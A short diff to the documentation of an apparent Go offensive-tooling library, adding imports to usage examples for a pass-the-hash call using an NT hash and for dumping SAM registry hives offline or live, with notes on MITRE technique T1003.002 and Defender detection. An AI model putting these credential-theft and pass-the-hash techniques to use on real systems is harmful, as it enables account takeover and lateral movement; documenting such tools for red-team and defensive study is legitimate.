@@ -419,7 +419,12 @@ network auth (SMB, RDP, NTLM challenge-response, and — when AES
 keys are supplied — Kerberos AS-REQ pre-auth).
 
 ```go
-import "github.com/oioio-space/maldev/credentials/sekurlsa"
+import (
+    "encoding/hex"
+    "fmt"
+
+    "github.com/oioio-space/maldev/credentials/sekurlsa"
+)
 
 ntlm, _ := hex.DecodeString("31d6cfe0d16ae931b73c59d7e0c089c0") // empty-string NT
 res, err := sekurlsa.Pass(sekurlsa.PTHParams{
@@ -489,7 +494,12 @@ local account's NT/LM hash without touching lsass. MITRE: T1003.002.
 | Live (Windows) | `LiveDump(dir string) (Result, sysPath, samPath string, error)` | HIGH — `reg save HKLM\SAM` is a Defender behavioral signal |
 
 ```go
-import "github.com/oioio-space/maldev/credentials/samdump"
+import (
+    "fmt"
+    "os"
+
+    "github.com/oioio-space/maldev/credentials/samdump"
+)
 
 // Offline — operator already exfilled the hives.
 sysF, _ := os.Open("system.hive")
